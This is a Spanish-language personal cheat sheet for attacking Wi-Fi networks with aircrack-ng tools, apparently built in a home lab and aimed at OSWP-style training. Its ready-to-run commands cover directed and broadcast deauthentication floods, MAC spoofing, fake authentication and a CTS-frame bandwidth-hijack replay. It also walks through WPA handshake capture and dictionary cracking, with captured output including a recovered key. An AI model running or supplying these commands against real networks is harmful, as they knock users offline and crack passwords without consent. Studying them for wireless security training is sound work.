      --fakeauth    delay : fake authentication with AP (-1)
      --interactive       : interactive frame selection (-2)
      --arpreplay         : standard ARP-request replay (-3)
      --chopchop          : decrypt/chopchop WEP packet (-4)
      --fragment          : generates valid keystream   (-5)
      --caffe-latte       : query a client for new IVs  (-6)
      --cfrag             : fragments against a client  (-7)
      --migmode           : attacks WPA migration mode  (-8)
      --test              : tests injection and quality (-9)

      --help              : Displays this usage screen
```

- Para crear el comando se deben asignar un número de paquetes de de-auth para enviar (ej. 10). 
- La `e` se refiere al ESSID.
- La `c` se refiere a la MAC del cliente víctima. 
- En caso de poner `0` será un ataque infinito

1. `Ventana a)` Poner la interface en modo `monitor` y monitorear el aire

    - OJO!!! PONERSE EN EL MISMO CANAL DE LA STA VÍCTIMA (Ej, `-c 11`)

````sh
airmon-ng check kill && airmon-ng start wlan0 && airodump-ng wlan0 -c 11
````
2. `Ventana b)` Lanzar ataque de `Deauthentication`

````sh
aireplay-ng --deauth 10000 -e Fz3r0_Air_PWN -c C8:94:02:B9:10:33 wlan0
````

- ó:

````sh
aireplay-ng --deauth 10000 -a 30:45:96:D7:F2:3E -c c8:94:02:b9:10:33 wlan0
````

3. En la Ventana a) recibiremos el `WPA handshake: 30:45:96:D7:F2:3E` en la parte superior derecha:

````java
 CH 11 ][ Elapsed: 18 s ][ 2023-01-20 15:48 ][ WPA handshake: 30:45:96:D7:F2:3E `<<<------- WPA Handshake

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 30:45:96:D7:F2:3E  -55  18      177      248    1  11   65   WPA2 CCMP   PSK  Fz3r0_Air_PWN                         
 F8:6C:E1:83:7A:99  -72  54      162       17    0  11  130   WPA2 CCMP   PSK  INFINITUM20E0_2.4                     

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   24:11:45:37:8D:F0  -63    0 - 1     36        9                                                   
 30:45:96:D7:F2:3E  C8:94:02:B9:10:33  -69    1e-11   1815     1469         Fz3r0_Air_PWN                             
 F8:6C:E1:83:7A:99  0A:5C:DF:F1:A9:8F   -1    1e- 0      0        2                                                   
Quitting...
````

- **NOTA:** Por alguna razón que aún no descubro durante el ataque no me marca `ACKs` sin embargo si capturo por wireshark si me aparecen, además que el ataque si funciona. Queda pendiente revisar este detalle. No obstante, tanto en PC como en smartphone funcionó la deauth. 


````sh
❯ aireplay-ng --deauth 10000 -e Fz3r0_Air_PWN -c C8:94:02:B9:10:33 wlan0
15:47:51  Waiting for beacon frame (ESSID: Fz3r0_Air_PWN) on channel 11
Found BSSID "30:45:96:D7:F2:3E" to given ESSID "Fz3r0_Air_PWN".
15:47:51  Sending 64 directed DeAuth (code 7). STMAC: [C8:94:02:B9:10:33] [ 0| 0 ACKs]
15:47:52  Sending 64 directed DeAuth (code 7). STMAC: [C8:94:02:B9:10:33] [ 0| 0 ACKs]
15:47:52  Sending 64 directed DeAuth (code 7). STMAC: [C8:94:02:B9:10:33] [ 0| 0 ACKs]
15:47:53  Sending 64 directed DeAuth (code 7). STMAC: [C8:94:02:B9:10:33] [ 0| 0 ACKs]
15:47:54  Sending 64 directed DeAuth (code 7). STMAC: [C8:94:02:B9:10:33] [ 0| 0 ACKs]
15:47:55  Sending 64 directed DeAuth (code 7). STMAC: [C8:94:02:B9:10:33] [ 0| 0 ACKs]
15:47:56  Sending 64 directed DeAuth (code 7). STMAC: [C8:94:02:B9:10:33] [ 0| 0 ACKs]
15:47:57  Sending 64 directed DeAuth (code 7). STMAC: [C8:94:02:B9:10:33] [ 0| 0 ACKs]    <<<---- 0 | 0 ACK bug
15:47:58  Sending 64 directed DeAuth (code 7). STMAC: [C8:94:02:B9:10:33] [ 0| 0 ACKs]
15:47:58  Sending 64 directed DeAuth (code 7). STMAC: [C8:94:02:B9:10:33] [ 0| 0 ACKs]                  Pero funciona!! :P
15:47:59  Sending 64 directed DeAuth (code 7). STMAC: [C8:94:02:B9:10:33] [ 0| 0 ACKs]
15:48:00  Sending 64 directed DeAuth (code 7). STMAC: [C8:94:02:B9:10:33] [ 0| 0 ACKs]
15:48:01  Sending 64 directed DeAuth (code 7). STMAC: [C8:94:02:B9:10:33] [ 0| 0 ACKs]
15:48:02  Sending 64 directed DeAuth (code 7). STMAC: [C8:94:02:B9:10:33] [ 0| 0 ACKs]
15:48:03  Sending 64 directed DeAuth (code 7). STMAC: [C8:94:02:B9:10:33] [ 0| 0 ACKs]
15:48:04  Sending 64 directed DeAuth (code 7). STMAC: [C8:94:02:B9:10:33] [ 0| 0 ACKs]
15:48:04  Sending 64 directed DeAuth (code 7). STMAC: [C8:94:02:B9:10:33] [ 0| 0 ACKs]
15:48:05  Sending 64 directed DeAuth (code 7). STMAC: [C8:94:02:B9:10:33] [ 0| 0 ACKs]
^C
````

## `aireplay-ng` De-authetication Attack: `Global`

- Una opción es enviar hacia una MAC broadcast como `FF:FF:FF:FF:FF:FF`

````sh
aireplay-ng --deauth 10000 -e Fz3r0_Air_PWN -c FF:FF:FF:FF:FF:FF wlan0
````

- ó:

````sh
aireplay-ng --deauth 10000 -a 30:45:96:D7:F2:3E -c FF:FF:FF:FF:FF:FF wlan0
````

- ó (sin ninguna MAC = Broadcast automático):

````sh
aireplay-ng --deauth 10000 -a 30:45:96:D7:F2:3E wlan0
````
````sh
 CH 11 ][ Elapsed: 3 mins ][ 2023-01-20 17:04 ][ WPA handshake: 30:45:96:D7:F2:3E   <<<------- WPA Handshake

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 30:45:96:D7:F2:3E  -39   0     1628     2710    0  11   65   WPA2 CCMP   PSK  Fz3r0_Air_PWN                         
 F8:6C:E1:83:7A:99  -69  37     1360       99    0  11  130   WPA2 CCMP   PSK  INFINITUM20E0_2.4                     

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   24:11:45:37:8D:F0  -61    0 - 1      0       39                                                   
 30:45:96:D7:F2:3E  C8:94:02:B9:10:33  -34    1e- 1      0     3158         Fz3r0_Air_PWN                             
 30:45:96:D7:F2:3E  FF:FF:FF:FF:FF:FF  -73    0 - 1    677     3840                                                   
 F8:6C:E1:83:7A:99  0A:5C:DF:F1:A9:8F  -73    0 - 1      0       20                                                   
Quitting...
````

- La ventaja de esta opción es que no importa quien se conecte, yo obtendré un handshake. 
















# Fz3r0 WiFi Destroyer Cheatsheet

## MAC Spoofing

- Recordar apagar y encender Interfaz:

````sh
ifconfig wlan0 down && macchanger --mac=c4:10:8a:f0:f0:f0 wlan0 && ifconfig wlan0 up
````

- Buscador de OUI con macchanger:

````sh
macchanger -l | grep "Ruckus"
````

## Configurando ALFA en modo monitor

- Para comenzar y terminar el modo monitor se utiliza:

```sh
airmon-ng check kill
```
```sh
airmon-ng start wlan0mon
```

- Especificar canal:

```sh
airmon-ng start wlan0mon 11
```

- Full:

````sh
airmon-ng check kill && airmon-ng start wlan0mon 11
````

- Detener:

```sh
airmon-ng stop wlan0
```

- Siempre hacer un restart al final que ya se haya parado:

```sh
service network-manager restart
```
- ó:

```sh
/etc/init.d/networking restart
```

- Full:

```sh
airmon-ng stop wlan0 && /etc/init.d/networking restart
```


## `Airodump` análisis de entorno con Evidencia:

### Análisis

````sh
airodump-ng wlan0 
````
- Puedo seleccionar cualquiera de los datos que puse en 3., ya sea `BSSID` o `SSID`:

    - `airodump-ng --essid Fz3r0_Air_PWN wlan0`

- Puedo filtrar por canal `-c`: 

    - `airodump-ng -c 1 wlan0 `

- Combinaciones:    

    - `airodump-ng -c 1 --essid Fz3r0_Air_PWN wlan0`

### Análisis + Guardar Evdencia

1. `Ventana a)`

    - Solo es necesario agregar el `-w` de write en el directorio que queremos guardar:

````sh
airodump-ng --essid Fz3r0_Air_PWN wlan0 -w captura_wifi_fz3r0
````

2. Después de ejecutar, revisar los archivos creados para poner tal cual el archivo `.cap` en el read (ya que le agrega un `-01`)

```sh
❯ ll
.rw-r--r-- root root   0 B  Fri Jan 20 09:37:14 2023  captura_wifi_fz3r0-01.cap   <<<------ .cap
.rw-r--r-- root root   0 B  Fri Jan 20 09:37:14 2023  captura_wifi_fz3r0-01.csv
.rw-r--r-- root root   0 B  Fri Jan 20 09:37:14 2023  captura_wifi_fz3r0-01.kismet.csv
.rw-r--r-- root root   0 B  Fri Jan 20 09:37:14 2023  captura_wifi_fz3r0-01.kismet.netxml
.rw-r--r-- root root 8.0 KB Fri Jan 20 09:37:17 2023  captura_wifi_fz3r0-01.log.csv
```

3. `Venana b)`

    - En la ventana paralela, hacer un `watch` del `.cap`, con el tiempo se irá guardando la data de ese SSID. 

````sh
watch -n 1 du -hc captura_wifi_fz3r0-01.cap
````

- Con el tiempo se irá guardando la data de ese SSID. 



## aireplay-ng Deauthentication Attack: `directed`

1. `Ventana a)` Poner la interface en modo `monitor` y monitorear el aire

    - OJO!!! PONERSE EN EL MISMO CANAL DE LA STA VÍCTIMA (Ej, `-c 11`)

````sh
airmon-ng check kill && airmon-ng start wlan0 && airodump-ng wlan0 -c 11
````
2. `Ventana b)` Lanzar ataque de `Deauthentication`

````sh
aireplay-ng --deauth 10000 -e Fz3r0_Air_PWN -c C8:94:02:B9:10:33 wlan0
````
- ó:

````sh
aireplay-ng --deauth 10000 -a 30:45:96:D7:F2:3E -c c8:94:02:b9:10:33 wlan0
````

3. En la Ventana a) recibiremos el `WPA handshake: 30:45:96:D7:F2:3E` en la parte superior derecha

## `aireplay-ng` De-authetication Attack: `Global`

- Una opción es enviar hacia una MAC broadcast como `FF:FF:FF:FF:FF:FF`

````sh
aireplay-ng --deauth 10000 -e Fz3r0_Air_PWN -c FF:FF:FF:FF:FF:FF wlan0
````

- ó:

````sh
aireplay-ng --deauth 10000 -a 30:45:96:D7:F2:3E -c FF:FF:FF:FF:FF:FF wlan0
````

- ó (sin ninguna MAC = Broadcast automático):

````sh
aireplay-ng --deauth 10000 -a 30:45:96:D7:F2:3E wlan0
````

## `aireplay-ng` False-authetication Attack: `Global`

- La finalidad es enviar un sin fin de paquetes de autenticación, con la flag `-h` se da la MAC falsa del dispositivo que queremos autenticar a la red. 

1. `Ventana a)` Poner la interface en modo `monitor` y monitorear el aire

    - OJO!!! PONERSE EN EL MISMO CANAL DE LA STA VÍCTIMA (Ej, `-c 11`)

2. Utilizar la MAC falsa en `-h` (`c4:10:8a:f0:f0:f0 (Ruckus Wireless)`) y la MAc victima `-a`, además del SSID e interface. 

````sh
aireplay-ng --fakeauth 10000 -e Fz3r0_Air_PWN -a 30:45:96:D7:F2:3E -h c4:10:8a:f0:f0:f0 wlan0
````

- Este no me sirvió igual peor meh... 


## CTS Frame Attack - Secuestro del Ancho de Banda de una red

- Capturar en wireshark NO AIRDUMP... `wlan0mon`

    - Esto debido a que sino no se captura el duration bien, de hecho wireshark lo marca en amarillo con 0's (mismo capturado desde AP Ruckus)



- Filter for Ready To Sends: `wlan.fc.type_subtype == 27` Bonus ;)

- Filter for Clear To Sends: `wlan.fc.type_subtype == 28` <<<---- CLS attack

- Recordar bien la cifra de la diración `p.e 64 microseconds` / `64us` (802.11 Radio Information > Duration)

- Guardar un paquete seleccionándolo, dándole `exportar paquetes especificados`... `wireshark/tcpdump...pcap` y seleciconar solo paquetes seleccionados.  

- Agrir con `ghex` el archivo `.pcap` guardado, el chiste aqui es cambiar el valor de la duración 

   - Debe ser el hexadecimal de `30,000` = `0x7530` (little indian (al revez) = 30 75) 

````sh
ghex 802.11_-_cts_clear-to-send.pcap > /dev/null 2>&1 &
````

- Lanzar el paquete modificado:

````sh
tcpreplay --intf1=wlan0 --topspeed --loop=2000 cts_frame-pcap 2>/dev/null
````

https://github.com/aircrack-ng/rtl8812au/issues/240

I have the same problem. No control packet is captured in the monitor mode with AWUS1900 with the latest driver on Ubuntu 18.04.



https://csn.murdoch.edu.au/mediawiki/index.php/RTS/CTS_and_Network_Analysis_using_Wireshark

https://csn.murdoch.edu.au/mediawiki/index.php/Alpha_USB_in_monitor_mode


ifconfig wlan0 down                       # Make sure the interface is down 
airmon-ng check kill                      # Kill things that might interfere with the process
iwconfig wlan0 mode monitor               # put it in monitor mode
rfkill unblock all                        # Make sure there are no hardware bocks
iwconfig wlan0 channel 1                  # Make sure you change the channel number to match the AP
ifconfig wlan0 up                         # Bring the interface back up

https://github.com/aircrack-ng/rtl8814au/issues/32



















































































encenderlo en canal 1 

airmon-ng start wifi0 1







# Proceso completo de ataque y Brute Force ASAP

- https://esgeeks.com/como-usar-aircrack-ng/


1. Monitoreo sencillo para identificar objetivo (kill, monitor on, dump live):

````sh
airmon-ng check kill && airmon-ng start wlan0mon && airodump-ng wlan0mon
````

2. Anotar `BSSID` y `Channel` del objetivo, por ejemplo: 

- BSSID = `30:45:96:D7:F2:3E` 
- Channel = `11`
- EESID = `Fz3r0_Air_PWN` 

3. Ejecutar el dump completamente dirigido al AP target (Channel + BSSID + Write Output)

````sh
airodump-ng -c 11 --bssid 30:45:96:D7:F2:3E --write Fz3r0_WiFi_Log wlan0mon
````

4. (Opcional) Lanzar `Deauthentication Attack` para crear `handshakes` _(o esperar a que los clientes haga autenticación real...)_

- `-a` = Es la dirección MAC de la red WiFi objetivo.
- `-e` = Es el ESSID de la red objetivo, es decir, su nombre.

````sh
aireplay-ng -0 10 -a 30:45:96:D7:F2:3E -e Fz3r0_Air_PWN wlan0mon
````

5. Detener el ataque, esperar a que se autentiquen y revisar si llegó algún `handshake` al arhcivo `Fz3r0_WiFi_Log-01.cap`, lanzar comando para desencriptar:

````sh
aircrack-ng Fz3r0_WiFi_Log-01.cap -w /usr/share/wordlists/rockyou.txt
````

- Listo! 

```java
                               Aircrack-ng 1.6 

      [00:00:01] 6253/10303727 keys tested (8332.39 k/s) 

      Time left: 20 minutes, 35 seconds                          0.06%

                          KEY FOUND! [ password10 ]


      Master Key     : FD FB 3C D0 14 FB E7 23 DA 2F 9C 90 1F 3F 5F 4E 
                       FB 32 E9 46 BD FD 5F 6E F9 06 24 53 CA 76 0C CC 

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : BE CA 45 62 3E DF B5 A3 AC 3D EB 3D DA 7C 94 98 
```

### Bonus

- Opcional MAC Spoofing:

````sh
ifconfig wlan0mon down && macchanger --mac=c4:10:8a:f0:f0:f0 wlan0mon && ifconfig wlan0mon up
````

---

- Crear Password Estúpido:

````sh
#!/bin/bash

    # Github:   Fz3r0

    # Twitter:  @Fz3r0_OPs

    # Youtube:  @Fz3r0_OPs

counter=0
clear
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-"
echo ""
echo "              Generador de Passwords Estúpidos v1.0 by Fz3r0"
echo ""
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-"
echo ""
echo "[+] Este script genera Passwords vulnerables, filtrados, públicos y estúpidos."
echo ""
echo "[+] ¡No utlizar ninguno de estos Passwords en Producción!" 
echo ""
echo "[+] ¡Esta herramienta está hecha para probar ataques de fuerza bruta!"
echo ""
echo "[+] Los Passwords generados tienen 10 o más caracteres (Perfectos para WPA2)"
echo ""
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-"
echo ""
echo "    5 PASSWORDS ESTÚPIDOS QUE UTILIZA TU TÍO EL BORRACHO SON:"
echo ""
#Obtenemos las primeras 10000 lineas del archivo rockyou.txt
head -10000 /usr/share/wordlists/rockyou.txt | shuf | while read line; do
    # Verificamos si la línea tiene 10 o más caracteres
    if [[ ${#line} -ge 10 ]]; then
        #Imprimimos la linea
        echo $line
        #Incrementamos el contador en 1
        counter=$((counter+1))
        #Verificamos si el contador ha alcanzado 5
        if [[ $counter -eq 5 ]]; then
            #Salimos del ciclo
            break
        fi
    fi
done
````

---





















## Recursos

### Cursos y Data


- https://gist.github.com/s4vitar/3b42532d7d78bafc824fb28a95c8a5eb?permalink_comment_id=3690188#configuraci%C3%B3n-de-la-tarjeta-de-red-y-tips
- https://www.youtube.com/watch?v=ekDHoW14Rb4
- https://www.mastermind.ac/courses/take/hacking-de-redes-inalambricas-wifi/lessons/18126307-bienvenid-al-curso
- https://help.offensive-security.com/hc/en-us/articles/360046904731-OSWP-Exam-Guide
- https://tryhackme.com/room/wifihacking101

### Aircrack NG

- https://www.aircrack-ng.org/


### Modo Monitor

- https://hromero99.github.io/Seguridad-en-redes-dom-sticas/crackingWifi/


24:11:45:37:8d:f0

- nuevas versiones pedos:

https://www.reddit.com/r/Kalilinux/comments/nm14i5/my_wlan0_doesnt_change_to_wlan0mon_but_it_shows/




---

la repsuesta  alos problemas?

- https://www.youtube.com/watch?v=EJa_2I84Q3c

- https://store.rokland.com/pages/usb-wifi-adapters

- https://store.rokland.com/pages/alfa-awus-1900-driver-and-support

- monitor mode script:

- https://store.rokland.com/pages/alfa-wireless-adapters-monitor-mode-help-linux

- `wget http://rokland.com/support/linux/start-mon.sh`

- `bash ./start-mon.sh wlan0mon`
